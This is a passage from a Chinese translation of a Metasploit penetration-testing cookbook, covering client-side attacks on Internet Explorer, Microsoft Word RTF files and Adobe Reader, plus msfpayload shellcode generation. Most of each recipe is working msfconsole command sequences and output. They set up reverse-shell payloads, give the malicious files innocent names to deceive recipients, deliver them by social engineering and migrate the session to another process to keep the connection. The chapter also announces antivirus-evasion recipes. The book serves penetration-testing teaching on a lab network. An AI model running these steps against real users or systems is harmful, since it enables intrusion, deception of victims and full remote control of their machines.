利用的各种参数将有助于创建特定文件和顶层共享。`BASENAME`参数包含要创建的文件的名称。`EXTENSIONS`是要创建的文件类型。`SHARENAME`是将为访问而创建的顶级共享目录。`SRVHOST`是本地监听端口，`SRVPORT`是`SRVHOST`将在其上监听连接的端口号。

1.  一旦设置了利用和有效载荷的各个参数，下一步就是执行利用。让我们看看当我们执行它时会发生什么：

```
msf exploit(webdav_dll_hijacker) > exploit
[*] Exploit running as background job.
[*] Started bind handler
[*]
[*] Exploit links are now available at
\\192.168.56.101\documents\ 
```

1.  一旦利用成功执行，它就开始监听连接，并提供一个共享链接，目标将不得不打开该链接以触发利用。让我们切换到目标屏幕看看会发生什么：![如何操作...](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/mtspl-pentest-cb/img/7423_03_01.jpg)

目标将查看一个简单的文件`policy.txt`，这个文件是攻击者共享的。这个文件是完全无害的。一旦用户执行了这个文件，就会与攻击者的机器建立连接，并建立 shell 连接。一旦文件在目标上执行，DLL 将执行，你将在你的`msfconsole`屏幕上看到大量的活动。一旦 DLL 注入成功，我们将有 shell 连接（见下图）：

![如何操作...](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/mtspl-pentest-cb/img/7423_03_02.jpg)

## 它是如何工作的...

让我们挖掘一下这个漏洞的原因。**动态链接库(DLL)**是微软在 Windows 上实现的共享库概念。DLL 是在运行时与程序相关联的可执行文件，用于加载与其链接的共享库。当应用程序运行时，`loadlibrary()`函数在运行时加载所需的 DLL。如果未指定要加载的 DLL 的位置，或者应用程序提供了不够合格的库路径，Windows 将使用其自己定义的顺序来搜索它。在这个默认顺序中的一个位置是当前工作目录。

现在，当目标用户访问共享位置时，它会到达一个受攻击者控制的区域。如何做到的呢？共享文件（`policy.txt`）包含了一个较低限定路径的 DLL，因此当目标用户执行它时，Windows 会开始搜索缺失的 DLL。现在，由于当前工作目录（`/documents`）受攻击者控制，他/她可以在其中添加一个恶意 DLL 代码，Windows 将执行它（因为当前工作目录是 Windows 寻找库文件的默认位置之一）。现在这个恶意 DLL 可以赋予攻击者执行外部脚本的权限。因此，有效载荷现在开始生效，并建立一个 shell 连接，为攻击者提供对目标系统的完全访问权限。这就是整个攻击向量是如何设计的。

## 还有更多...

我们可以使用 H. D. Moore 开发的一个简单工具来寻找 DLL 注入。让我们快速了解一下。

### H. D. Moore 的 DllHijackAudit 工具

Metasploit 的创始人 H. D. Moore 创建了这个安全审计工具，它可以用于在您自己的环境中测试 DLL 注入漏洞。它利用了进程监控实用程序和 Ruby 解释器。它通过监视相关文件的工作目录中是否访问了 DLL 来工作。它还生成测试报告。该工具和详细文档可以在[`blog.metasploit.com/2010/08/better-faster-stronger.html`](http://blog.metasploit.com/2010/08/better-faster-stronger.html)找到。


# 第四章：客户端攻击和防病毒绕过

在本章中，我们将涵盖：

+   Internet Explorer 不安全的脚本配置漏洞

+   Internet Explorer 递归调用内存损坏

+   Microsoft Word RTF 堆栈缓冲区溢出

+   Adobe Reader `util.printf()`缓冲区溢出

+   从`msfpayload`生成二进制和 shellcode

+   使用`msfencode`绕过客户端防病毒保护

+   使用`killav.rb`脚本禁用防病毒程序

+   深入了解`killav.rb`脚本

+   从命令行终止防病毒服务

# 介绍

在上一章中，我们专注于对目标操作系统进行渗透测试。操作系统是渗透目标的第一层，因为未打补丁和过时的操作系统很容易被利用，这将减少我们寻找其他渗透目标方法的努力。但情况可能有所不同。有时防火墙可能会阻止我们的扫描数据包，从而阻止我们获取有关目标操作系统或开放端口的任何信息。

还有可能目标有自动更新，定期修补操作系统的漏洞。这可能再次阻止所有渗透目标的攻击。这样的安全措施可以防止我们通过利用操作系统中已知的漏洞来获取对目标机器的访问。因此，我们必须向前迈进一步。这就是客户端攻击和绕过防病毒技术发挥作用的地方。让我们首先了解典型的客户端攻击向量。

假设渗透测试人员已经发现目标机器安装了更新的 Windows XP SP3 操作系统，并设置 Internet Explorer 7 作为默认浏览器来访问互联网和其他与网络相关的服务。因此，渗透测试人员现在将构建一个恶意 URL，其中包含一个可利用 IE 7 已知漏洞的可执行脚本。现在他构建了一个看似无害的 HTML 页面，并创建了一个包含相同恶意 URL 的超链接。接下来，他通过社会工程将 HTML 页面传输给目标用户，并以某种方式诱使他点击恶意超链接。由于该链接包含 IE 7 浏览器的已知漏洞利用，它可以破坏浏览器并允许进一步的代码执行，从而使渗透测试人员能够控制目标系统。他可以继续设置后门、释放病毒等。

现在到底发生了什么？尽管目标机器运行了经过修补和更新的 Windows 操作系统，但默认浏览器 IE 7 并未更新，或者说被目标用户忽视了。这使得渗透测试人员能够构建一个场景，并通过浏览器漏洞进入系统。

先前讨论的情景是一个简单的客户端攻击，目标在不知情的情况下执行了一个利用目标用户使用的应用软件中的漏洞的脚本。成功执行利用后，攻击者会破坏系统安全。

Metasploit 为我们提供了大量针对几种流行软件的利用模块，可以用于执行客户端攻击。本章将讨论的一些流行工具包括 Internet Explorer、Microsoft Office 套件、Adobe Reader、Flash 等。Metasploit 存储库包含这些流行工具的多个模块。让我们快速分析 Metasploit 中的客户端攻击过程。我们的目标是通过客户端执行成功攻击目标并建立 shell 连接。

Metasploit 将这个渗透过程分解为两个简单的步骤：

1.  为您选择的应用程序工具生成相应的恶意链接/文件。然后，它开始在特定端口上监听与目标的反向连接。然后攻击者将恶意链接/文件发送给目标用户。

1.  现在一旦目标执行了恶意链接/文件，应用程序就会被利用，Metasploit 立即将有效载荷传输到其他 Windows 进程，这样如果目标应用程序崩溃（由于利用）或用户关闭应用程序，连接仍然保持。

当我们讨论基于客户端的攻击的配方时，前面两个步骤将对你来说是清晰的。本章将专注于基于 Windows 操作系统的一些关键应用软件。我们将从分析基于浏览器的客户端攻击开始。我们将研究 Internet Explorer（版本 6、7 和 8）中的各种现有漏洞，以及如何针对它来渗透用户机器。然后，我们将转向另一个名为 Microsoft Office（版本 2003 和 2007）的流行软件包，并分析其格式漏洞。然后，我们将继续分析 PDF 漏洞，以及如何使用恶意 PDF 来破坏用户安全。最后，但并非最不重要的，我们将讨论渗透测试中非常重要的一个方面，即绕过防病毒软件。它将重点放在覆盖客户端防病毒保护，以在不引起警报的情况下利用目标机器。

本章将充分利用 Metasploit 框架的全部功能，让你会喜欢阅读和实施它。让我们继续本章的配方。

# Internet Explorer 不安全的脚本配置漏洞

让我们从第一个基于浏览器的客户端攻击开始。使用任何客户端攻击模块的基本过程与我们在之前章节中讨论的类似。唯一的区别在于将利用传输到目标机器。与基于操作系统的利用不同，客户端利用需要手动执行利用和有效载荷。一旦我们进行配方，你将清楚地理解它。所以让我们快速地开始实施攻击。

## 做好准备

我们将开始启动我们的 msfconsole 并选择相关的利用。这个过程与我们在之前章节中讨论的类似。然后，我们将继续选择一个有效载荷，它将帮助我们与目标机器建立 shell 连接。在这个配方中，我们将处理的利用是`exploit/windows/browser/i.e. unsafe scripting`。

### 注意

这个利用已知影响 Internet Explorer 6 和 7 版本，它们是 Windows XP 和 2003 服务器所有版本的默认浏览器。但它甚至成功运行在我的 Windows 7 ultimate 上，使用的是 Internet Explorer 8（未打补丁）。

当 Internet Explorer 中标记了**未标记为安全的初始化和脚本 ActiveX 控件**设置时，这个利用就会生效。可以通过启动 Internet Explorer 并浏览到**工具** | **Internet 选项** | **安全** | **自定义级别** | **未标记为安全的初始化和脚本 ActiveX 控件** | **启用**来找到这个设置。

![做好准备](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/mtspl-pentest-cb/img/7423_04_01.jpg)

其他版本的 Internet Explorer 也可以进行类似的设置。在这个配方中，我们将利用两个不同的目标。一个运行 Windows XP SP2，IE 7，另一个运行 Windows 7，IE 8。现在让我们继续执行利用。

## 操作步骤...

让我们开始启动 msfconsole 并将我们的相应利用设置为活动状态。一旦被利用，我们将使用`reverse_tcp`有效载荷与这两个目标建立 shell 连接：

```
msf > use exploit/windows/browser/ie_unsafe_scripting
msf exploit(ie_unsafe_scripting) > set payload windows/meterpreter/reverse_tcp
payload => windows/meterpreter/reverse_tcp
msf exploit(ie_unsafe_scripting) > show options
Module options (exploit/windows/browser/ie_unsafe_scripting):
Name Current Setting Required Description
---- --------------- -------- -----------
SRVHOST 0.0.0.0 yes The local host to..
SRVPORT 8080 yes The local port to..
SSL false no Negotiate SSL..
SSLCert no Path to a custom SSL..
SSLVersion SSL3 no Specify the version..
URIPATH no The URI to use for..
Payload options (windows/meterpreter/reverse_tcp):
Name Current Setting Required Description
---- --------------- -------- -----------
EXITFUNC process yes Exit technique: seh..
LHOST yes The listen address
LPORT 4444 yes The listen port
Exploit target:
Id Name
-- ----
0 Automatic
msf exploit(ie_unsafe_scripting) > set LHOST 192.168.56.101
LHOST => 192.168.56.101 
```

现在我们的利用程序和有效载荷已经被设置为活动状态。正如你所看到的，我们在这里没有使用 RHOST 选项，因为这是一个基于客户端的攻击。让我们看看当我们执行`exploit`命令时会发生什么：

```
msf exploit(ie_unsafe_scripting) > exploit
[*] Exploit running as background job.
[*] Started reverse handler on 192.168.56.101:4444
[*] Using URL: http://0.0.0.0:8080/2IGIaOJQB
[*] Local IP: http://192.168.56.101:8080/2IGIaOJQB
[*] Server started. 
```

正如我们所看到的，`exploit`命令的结果生成了一个链接。这是我们将不得不发送给我们的目标的恶意链接（`http://192.168.56.101:8080/2IGIaoJQB`），以便它可以利用他们的浏览器。最后一行还说“服务器已启动”，实际上是在端口 4444 上监听来自目标机器的连接。让我们首先分析链接在 Windows XP 目标机器上的执行结果。

浏览器将尝试加载页面，但最终不会显示任何内容。相反，浏览器要么会挂起，要么会保持空闲状态。但你会注意到你的 msfconsole 上有一些活动。这个活动将类似于以下命令行中显示的活动：

```
msf exploit(ie_unsafe_scripting) > [*] Request received from 192.168.56.102:1080...
[*] Encoding payload into vbs/javascript/html...
[*] Sending exploit html/javascript to 192.168.56.102:1080...
[*] Exe will be uunqgEBHE.exe and must be manually removed from the %TEMP% directory on the target.
Sending stage (752128 bytes) to 192.168.56.102
[*] Meterpreter session 1 opened (192.168.56.101:4444 -> 192.168.56.102:1081) at 2011-11-12 21:09:26 +0530 
```

太棒了！我们与目标机器有一个活动会话。前面的命令行输出显示，在我们的目标的`temp`文件夹中创建了一个可执行文件，这个文件负责整个利用过程。

让我们现在分析这个恶意链接在运行 IE 8 的 Windows 7 机器上的执行结果。

我们将注意到 Internet Explorer 会提示一个警报消息。点击**允许**后，外部脚本将被执行，浏览器可能会崩溃或挂起（取决于系统）。

![如何做...](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/mtspl-pentest-cb/img/7423_04_02.jpg)

让我们切换到攻击 msfconsole 并注意活动。我们将注意到以下命令行活动：

```
msf exploit(ie_unsafe_scripting) > [*] Request received from 192.168.56.1:51115...
[*] Encoding payload into vbs/javascript/html...
[*] Sending exploit html/javascript to 192.168.56.1:51115...
[*] Exe will be uddoE.exe and must be manually removed from the %TEMP% directory on the target.
[*] Sending stage (752128 bytes) to 192.168.56.1
[*] Meterpreter session 2 opened (192.168.56.101:4444 -> 192.168.56.1:51116) at 2011-11-12 21:15:47 +0530 
```

我们还有一个与 Windows 7 机器打开的活动会话。让我们开始与我们的会话互动：

```
msf exploit(ie_unsafe_scripting) > sessions
Active sessions
===============
Id Type Information Connection
-- ---- ----------- ----------
1 meterpreter x86/win32 DARKLORD-9CAD38\darklord
2 meterpreter x86/win32 HackingAlert-PC\hackingalert 
```

正如你所看到的，`sessions`命令显示了我们可以使用的活动会话。一个是我们的 Win XP 机器，另一个是 Win7 机器。让我们继续与第二个会话互动，也就是 Windows 7 机器。

```
msf exploit(ie_unsafe_scripting) > sessions -i 1
meterpreter > shell
Process 4844 created.
Channel 1 created.
Microsoft Windows [Version 6.1.7264]
Copyright (c) 2009 Microsoft Corporation. All rights reserved.
C:\Windows\system32> 
```

## 它是如何工作的...

工作过程可能对你来说很清楚。让我们专注于这个利用的原因。当设置“未标记为脚本安全的 ActiveX 控件的初始化和脚本”时，它允许访问`WScript.Shell` ActiveX 控件。这个`WScript.Shell`对象提供了读取文件系统、环境变量、读取和修改注册表以及管理快捷方式的功能。`WScript.Shell`的这个特性允许攻击者创建一个 JavaScript 来与文件系统交互并运行命令。

## 还有更多...

让我们谈谈另一个可以在客户端攻击中使用的重要基于浏览器的利用。

### Internet Explorer Aurora 内存损坏

这是另一个广泛使用的 IE 利用，于 2010 年中期曝光。这个漏洞是“极光行动”的关键组成部分，黑客们针对一些顶级公司。该模块利用了 IE 6 中的内存损坏漏洞。我将把这个模块留给你作为一个练习来尝试和探索。利用可以在`exploit/windows/browser/ms10_002_aurora`中找到。

# Internet Explorer CSS 递归调用内存损坏

这是 Windows 平台上运行 IE 浏览器的最新利用之一。这个利用已知影响 Windows 7 和 Windows 2008 服务器，IE 8 作为默认浏览器。这个利用的工作过程与我们刚刚在上一个示例中讨论的工作过程类似。所以让我们快速测试一下。我们的目标机器是运行 IE 8（未打补丁）的 Windows 7 旗舰版。

## 准备就绪

我们将从启动 msfconsole 开始。在这个示例中，我们的利用是`exploit/windows/browser/ms11_003_ie_css_import`，我们的有效载荷将是`windows/meterpreter/bind_tcp`，这将帮助我们与目标机器建立 shell 连接。

## 如何做...

我们将以迄今为止的相同方式开始。首先，我们将选择利用。然后，我们将选择有效载荷，并传递利用和有效载荷所需的各种参数值。让我们在我们的 msfconsole 中继续进行所有这些步骤。

```
msf > use exploit/windows/browser/ms11_003_ie_css_import
msf exploit(ms11_003_ie_css_import) > set payload windows/meterpreter/reverse_tcp
payload => windows/meterpreter/reverse_tcp
smsf exploit(ms11_003_ie_css_import) > set LHOST 192.168.56.101
LHOST => 192.168.56.101
msf exploit(ms11_003_ie_css_import) > exploit
[*] Exploit running as background job.
[*] Started reverse handler on 192.168.56.101:4444
[*] Using URL: http://0.0.0.0:8080/K9JqHoWjzyAPji
[*] Local IP: http://192.168.56.101:8080/K9JqHoWjzyAPji
[*] Server started. 
```

正如我们所看到的，漏洞利用和有效载荷已经设置，并带有各种参数。执行`exploit`命令后，模块生成了一个本地链接`http://192.168.56.101:8080/K9JqHoWjzyAPji`。这是恶意链接，必须传输给目标，以便他在 IE 浏览器中执行。目标浏览器将完全冻结，并且将占用系统资源的大部分。目标将被迫关闭浏览器。让我们在 msfconsole 上监视活动：

```
[*] 192.168.56.1:52175 Received request for "/K9JqHoWjzyAPji/\xEE\x80\xA0\xE1\x81\x9A\xEE\x80\xA0\xE1\x81\x9A\xEE\x80\xA0\xE1\x81\x9A\xEE\x80\xA0\xE1\x81\x9A"
[*] 192.168.56.1:52175 Sending
windows/browser/ms11_003_ie_css_import CSS
[*] Sending stage (752128 bytes) to 192.168.56.1
[*] Meterpreter session 1 opened (192.168.56.101:4444 -> 192.168.56.1:52176) at 2011-11-15 13:18:17 +0530
[*] Session ID 1 (192.168.56.101:4444 -> 192.168.56.1:52176) processing InitialAutoRunScript 'migrate -f'
[*] Current server process: iexplore.exe (5164)
[*] Spawning notepad.exe process to migrate to
[+] Migrating to 5220
[+] Successfully migrated to process 
```

在目标浏览器成功执行漏洞利用后，我们在 msfconsole 中启动了一个会话，从而打开了 shell 连接。但在 msf 和目标之间建立会话后，还会发生更多的事情。`InitialAutoRunScript`执行了一个`migrate -f`命令，将有效载荷从`iexplore.exe`迁移到`notepad.exe`。这一步对于持久连接是必不可少的。即使目标用户关闭了浏览器，连接仍然会保持活动，因为我们已经迁移到另一个进程。

## 工作原理...

让我们挖掘一下这个漏洞，以获取更多信息。嗯，漏洞的原因正是它的名字所说的。当微软的 HTML 引擎（mshtml）解析递归多次导入相同的 CSS 文件的 HTML 页面时，就会导致内存损坏并允许任意代码执行。考虑以下 HTML 代码片段。

```
// html file
<link href="css.css" rel="stylesheet" type="text/css" />
// css file
*{
color:red;
}
@import url("css.css");
@import url("css.css");
@import url("css.css");
@import url("css.css"); 
```

同一个 CSS 文件被调用了四次。当 mshtml 解析这个 HTML 页面时，就会导致内存损坏。这个漏洞利用利用了堆喷射和.NET 2.0 **mscorie.dll**模块的组合来绕过 DEP 和 ASLR。由于系统资源的过度消耗，最终会崩溃。使用这个漏洞，攻击者获得与已登录用户相同的用户权限。

![工作原理...](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/mtspl-pentest-cb/img/7423_04_03.jpg)

在前面的屏幕截图中，您可以看到背景是 IE 实例，其中执行了恶意链接，前景图像是 Windows 任务管理器，您可以清楚地看到 IE 浏览器过度消耗内存。在任务管理器中还有一件有趣的事情要注意，那就是 notepad.exe 进程。尽管没有运行 notepad 的实例，但任务管理器仍然显示这个进程。这样做的明显原因是我们已经从 iexplorer.exe 迁移到 notepad.exe，所以这个进程在后台运行。

## 还有更多...

在使用这个漏洞利用模块时，我们可能会遇到一个常见的错误。让我们快速看一下，并找出相关的解决方案。

### 缺少.NET CLR 2.0.50727

在使用这个漏洞利用模块时，您可能会遇到一个错误"目标机器没有.NET CLR 2.0.50727"。嗯，这个错误的原因不是因为缺少.NET。它的主要原因是因为 Internet Explorer 没有设置为默认浏览器，因此用户代理被滥用以从非 ASLR 区域获取地址。通过将 Internet Explorer 设置为默认的 Web 浏览器，可以克服这个错误。

# Microsoft Word RTF 堆栈缓冲区溢出

在前两个教程中，我们完全专注于基于浏览器的漏洞利用。现在在这个教程中，我们将专注于另一个流行的 Windows 工具，称为 Microsoft Office。RTF 缓冲区溢出漏洞存在于 Office 软件包的 2010 和 2007 版本中。这个漏洞存在于 Microsoft Word RTF 解析器中的`pfragments`形状属性的处理中。让我们详细了解这个漏洞利用。我假设我们已经获得了关于我们的目标的信息，即他的系统上安装了 Office 软件包。

## 准备工作

我们将从启动 msfconsole 开始。我们将在这个教程中使用的漏洞可以在`exploit/windows/fileformat/ms10_087_rtf_pfragments_bof`中找到。我们将使用的有效载荷是`windows/meterpreter/reverse_tcp`，以与目标机器建立 shell 连接。

## 如何做...

工作过程将与我们在以前的食谱中看到的类似。我们将首先设置我们的利用。然后，我们将选择一个有效载荷，然后传递相关参数，以便成功执行利用。让我们执行这些步骤。

```
msf > use exploit/windows/fileformat/ms10_087_rtf_pfragments_bof
msf exploit(ms10_087_rtf_pfragments_bof) > set payload windows/meterpreter/reverse_tcp
payload => windows/meterpreter/reverse_tcp
msf exploit(ms10_087_rtf_pfragments_bof) > show options
Module options (exploit/windows/fileformat/ms10_087_rtf_pfragments_bof):
Name Current Setting Required Description
---- --------------- -------- -----------
FILENAME msf.rtf yes The file name.
Payload options (windows/meterpreter/reverse_tcp):
Name Current Setting Required Description
---- --------------- -------- -----------
EXITFUNC process yes Exit technique: seh..
LHOST yes The listen address
LPORT 4444 yes The listen port
Exploit target:
Id Name
-- ----
0 Automatic 
```

利用包含一个`FILENAME`参数，其中包含有关要创建的恶意文件名的信息。默认值为`msf.rtf`。让我们将其更改为一些不太可疑的名称。我们还将设置`LHOST`的值，这是攻击机的 IP 地址。

```
msf exploit(ms10_087_rtf_pfragments_bof) > set FILENAME priceinfo.rtf
FILENAME => priceinfo.rtf
msf exploit(ms10_087_rtf_pfragments_bof) > set LHOST 192.168.56.101 
```

文件名已更改为`priceinfo.rtf`，`LHOST`的值已设置为`192.168.56.101`。所以我们已经准备好执行利用模块了。

```
msf exploit(ms10_087_rtf_pfragments_bof) > exploit
[*] Creating 'priceinfo.rtf' file ...
[+] priceinfo.rtf stored at /root/.msf4/local/priceinfo.rtf 
```

Metasploit 已经为我们创建了一个恶意文件，我们必须使用它来进行客户端攻击。该文件位于`/root/.msf4/local/priceinfo.rtf`。现在的下一步是将此文件发送给目标用户，可以通过邮件或其他媒介。一旦目标用户执行了这个恶意文件，我们会注意到它会以一个 Word 文档的形式打开。在执行几秒钟后，Microsoft Word 实例将挂起或崩溃，具体取决于系统。与此同时，恶意文件成功执行利用，并为目标提供了一个活动会话。为了使连接持久，利用将自己迁移到后台运行的其他进程。

```
Sending stage (752128 bytes) to 192.168.56.1
[*] Meterpreter session 2 opened (192.168.56.101:4444 -> 192.168.56.1:57031) at 2011-11-13 23:16:20 +0530
[*] Session ID 2 (192.168.56.101:4444 -> 192.168.56.1:57031) processing InitialAutoRunScript 'migrate -f'
[*] Current server process: WINWORD.EXE (5820)
[*] Spawning notepad.exe process to migrate to
[+] Migrating to 5556
[+] Successfully migrated to process 
```

命令行的前几行显示了成功执行利用，结果是与`SESSION ID = 2`的活动会话。命令行的最后部分显示，利用已成功从`WINWORD.EXE`迁移到`notepad.exe`。

## 工作原理...

利用模块简单地创建一个恶意的 Word 文件，向 Word 解析器传递非法值。解析器无法识别非法值导致缓冲区溢出。然后有效载荷开始执行代码，与攻击机建立反向连接。这种攻击的成功与机器有关，因为有时**Windows ASLR（地址空间布局随机化）**可能会阻止执行任意代码（有效载荷）。

## 还有更多...

Office 套件还有另一个流行的利用。我将把它作为一个实践的课程留给你。在这里，我将简要概述一下。

### Microsoft Excel 2007 缓冲区溢出

这个已知的利用针对 Microsoft Excel 工具（`.xlb`）的 2007 版本。执行恶意的.xlb 文件可能导致基于堆栈的缓冲区溢出，并导致任意代码执行。利用可以在`exploit/windows/fileformat/ms11_021_xlb_bof`中找到。

# Adobe Reader util.printf()缓冲区溢出

PDF 是用于共享文件和文档的最广泛使用的格式之一。因此，将其用作利用目标机器的潜在武器可能是一个有益的想法。Adobe Reader 是最流行的 PDF 文件阅读工具。我们将讨论的利用是存在于 Adobe Reader 8.1.3 版本之前的漏洞。利用的工作原理是创建一个恶意的 PDF 文件，当在 Adobe Reader 的易受攻击版本中打开时，会导致缓冲区溢出，并允许任意代码执行。

## 准备工作

利用过程与本章迄今讨论的利用非常相似。几乎所有客户端攻击都以类似的方式工作，我们首先生成一个恶意文件/链接，然后以某种方式要求目标用户在其机器上执行它。因此，客户端攻击也涉及社会工程。让我们继续进行这次利用。在这里，我们的目标机器是运行 Adobe Reader 8.1 的 Windows XP SP3。

我们将从启动我们的 msfconsole 开始，并使用模块`exploit/windows/fileformat/adobe_utilprintf`和有效载荷模块`windows/meterpreter/reverse_tcp`。

## 如何做...

我们将从选择漏洞利用并将其设置为活动开始。然后，我们将设置有效载荷。在选择漏洞利用和有效载荷之后，我们的下一步将是传递执行所需的各种参数值。所以，让我们继续在 msfconsole 上执行这些步骤。

```
msf > use exploit/windows/fileformat/adobe_utilprintf
msf exploit(adobe_utilprintf) > set payload windows/meterpreter/reverse_tcp
payload => windows/meterpreter/reverse_tcp
msf exploit(adobe_utilprintf) > show options
Module options (exploit/windows/fileformat/adobe_utilprintf):
Name Current Setting Required Description
---- --------------- -------- -----------
FILENAME msf.pdf yes The file name.
Payload options (windows/meterpreter/reverse_tcp):
Name Current Setting Required Description
---- --------------- -------- -----------
EXITFUNC process yes Exit technique: seh..
LHOST yes The listen address
LPORT 4444 yes The listen port
Exploit target:
Id Name
-- ----
0 Adobe Reader v8.1.2 (Windows XP SP3 English) 
```

如你所见，目标版本的 Adobe Reader 被列为 8.1.2，操作系统被标记为 Windows XP SP3。因此，这次漏洞利用的成功将在很大程度上取决于目标使用的 Adobe Reader 版本或操作系统。

漏洞利用模块包含一个带有默认值的参数`FILENAME`。这个参数决定了将要创建的恶意 PDF 文件的名称。让我们将其值更改为一些不太可疑的东西。同时，我们还必须在`LHOST`参数中传递本地机器的 IP 地址。

```
msf exploit(adobe_utilprintf) > set FILENAME progressreport.pdf
FILENAME => progressreprt.pdf
msf exploit(adobe_utilprintf) > set LHOST 192.168.56.101
LHOST => 192.168.56.101 
```

现在我们已经准备好执行漏洞利用命令并生成恶意 PDF 文件，这将用于我们的客户端攻击。

```
msf exploit(adobe_utilprintf) > exploit
[*] Creating 'progressreport.pdf' file...
[+] progressreport.pdf stored at /root/.msf4/local/progressreport.pdf 
```

最后，一个名为`progressreport.pdf`的恶意 PDF 文件已经被创建并存储在`/root/.msf4/local`文件夹中。

这一次，我们将采用稍微不同的方法来启动反向连接的监听器。假设有一种情况，当你不得不突然关闭你的 msfconsole 时。那么漏洞利用怎么办？我们需要再次创建恶意 PDF 吗？答案是否定的。Metasploit 中有一个特殊的监听器模块，可以用来在 msfconsole 上启动监听器，这样你就可以使用为客户端攻击生成的相同文件/链接继续进行渗透测试过程。假设我们已经生成了恶意 PDF 文件，但尚未用于客户端攻击。所以让我们再次启动 msfconsole，并使用`exploit/multi/handler`模块设置反向连接的监听器。

```
msf > use exploit/multi/handler
msf exploit(handler) > show options
Module options (exploit/multi/handler):
Name Current Setting Required Description
---- --------------- -------- -----------
Exploit target:
Id Name
-- ----
0 Wildcard Target
msf exploit(handler) > set payload windows/meterpreter/reverse_tcp
payload => windows/meterpreter/reverse_tcp
msf exploit(handler) > show options
Module options (exploit/multi/handler):
Name Current Setting Required Description
---- --------------- -------- -----------
Payload options (windows/meterpreter/reverse_tcp):
Name Current Setting Required Description
---- --------------- -------- -----------
EXITFUNC process yes Exit technique: she..
LHOST yes The listen address
LPORT 4444 yes The listen port
Exploit target:
Id Name
-- ----
0 Wildcard Target
msf exploit(handler) > set LHOST 192.168.56.101
LHOST => 192.168.56.101 
```

如你所见，我们已经设置了模块`multi/handler`，然后我们还为其添加了有效载荷。下一步是根据使用情况添加`LHOST`和`LPORT`。我们还有一个额外的选项，可以在 multi/handler 模块中运行额外的脚本。我们将在下一章中讨论它。最后一步是执行漏洞利用命令并启动监听器。

```
msf exploit(handler) > exploit
[*] Started reverse handler on 192.168.56.101:4444 
```

所以我们的反向处理程序已经启动并运行。现在它已经准备好在目标机器上恶意 PDF 被执行后接收连接。

一旦 PDF 在客户端机器上执行，它会完全冻结，Adobe Reader 会完全挂起，导致服务拒绝。这次崩溃的原因是由于恶意 PDF 文件引起的缓冲区溢出。在攻击者端，你会看到一个 meterpreter 会话已经启动，现在目标机器可以远程处理。

```
[*] Started reverse handler on 192.168.56.101:4444
[*] Starting the payload handler...
[*] Sending stage (752128 bytes) to 192.168.56.102
[*] Meterpreter session 1 opened (192.168.56.101:4444 -> 192.168.56.102:1035) at 2011-11-25 12:29:36 +0530
meterpreter > shell
Process 1880 created.
Channel 1 created.
Microsoft Windows XP SP3
(C) Copyright 1985-2001 Microsoft Corp.
E:\> 
```

## 它是如何工作的...

这个问题是在易受攻击的 Adobe Reader 版本中实现 JavaScript `util.printf()`函数的方式中被发现的。该函数首先将其接收到的参数转换为字符串，只使用参数的前 16 位数字，并用固定值“0”（0x30）填充其余部分。通过向函数传递过长且格式正确的命令，可以覆盖程序的内存并控制其执行流程。Metasploit 模块创建了一个特别设计的 PDF 文件，嵌入了 JavaScript 代码来操纵程序的内存分配模式并触发漏洞。这可以让攻击者以运行 Adobe Reader 应用程序的用户权限执行任意代码。

考虑嵌入在 PDF 中的以下两行 JavaScript 代码：

```
var num = 1.2
util.printf("%5000f",num) 
```

这两行简单的 JavaScript 代码会在堆栈上复制 5000 次字节 0x20。这允许你控制异常处理程序，并在尝试写入堆栈后面的部分时触发异常。

# 从 msfpayload 生成二进制和 shellcode

到目前为止，我们已经讨论了许多可以用于利用客户端攻击渗透目标机器的技术。所有这些技术都涉及利用运行在客户端机器上的各种应用软件中的漏洞。但是，可能存在一种情况，先前讨论的技术可能无法奏效。这些攻击使我们处于对应用软件的漏洞的控制之下，我们必须利用这些漏洞以获取访问权限。

Metasploit 为我们提供了另一个功能，我们可以执行客户端攻击，而不必担心利用目标机器上运行的应用软件。`msfpayload`就是解决方案。让我们简要介绍一下`msfpayload`，然后继续实际实施。

`msfpayload`是 Metasploit 的命令行实例，用于生成 Metasploit 存储库中可用的各种文件类型的 shellcode。可用的文件类型选项包括 C、Ruby、Raw、Exe、Dll、VBA 和 War。我们可以使用`msfpayload`将任何 Metasploit shellcode 转换为这些提到的文件格式之一。然后，它可以传输到目标机器上执行。一旦文件在目标机器上执行，我们将获得一个活动会话。这减少了利用目标机器上运行的应用软件中存在的任何漏洞的开销。`msfpayload`的另一个主要好处是，它可以用于生成特定编程语言（如 C、Ruby 等）的定制 shellcode，这些 shellcode 可以在您自己的利用开发代码中使用。

使用`msfpayload`的一个主要缺点是，当目标尝试执行它时，使用它生成的文件很容易被杀毒程序检测到。让我们继续前进，感受一下`msfpayload`可以为我们的渗透测试过程增添的力量。

## 准备工作

让我们开始尝试`msfpayload`。我们将从启动 BackTrack 终端开始。我们可以使用命令`msfpayload -h`来查看其用法的描述。

```
root@bt:~# msfpayload -h
Usage: /opt/framework3/msf3/msfpayload [<options>] <payload> [var=val] <[S]ummary|C|[P]erl|Rub[y]|[R]aw|[J]s|e[X]e|[D]ll|[V]BA|[W]ar> 
```

要查看可用的 shellcode 列表，我们可以使用`msfpayload -l`命令。您将发现我们可以使用的大量可用 shellcode 列表。

## 如何做...

让我们继续看看如何在 C 语言中生成特定定制的 shellcode。我们将使用`windows/shell/reverse_tcp`有效载荷来生成其 C 语言的 shellcode。我们将首先选择我们各自的有效载荷 shell 并传递各种参数值。

```
root@bt:~# msfpayload windows/shell/reverse_tcp o
Name: Windows Command Shell, Reverse TCP Stager
Module: payload/windows/shell/reverse_tcp
Version: 10394, 11421
Platform: Windows
Arch: x86
Needs Admin: No
Total size: 290
Rank: Normal
Basic options:
Name Current Setting Required Description
---- --------------- -------- -----------
EXITFUNC process yes Exit technique: seh..
LHOST yes The listen address
LPORT 4444 yes The listen port 
```

注意命令行中的小`o`参数列出了 shellcode 有效载荷的各种参数选项。我们将不得不传递这些值，以生成我们自己使用的定制 shellcode。

```
root@bt:~# msfpayload windows/shell/reverse_tcp LHOST=192.168.56.101 LPORT=4441 o 
```

因此，我们已根据需要设置了`LHOST`和`LPORT`。下一步将是为我们定制的 shell 生成 C 代码（显示的输出已经被缩短以适应）。

```
root@bt:~# msfpayload windows/shell/reverse_tcp LHOST=192.168.56.101 LPORT=4441 C
/*
* windows/shell/reverse_tcp - 290 bytes (stage 1)
* http://www.metasploit.com
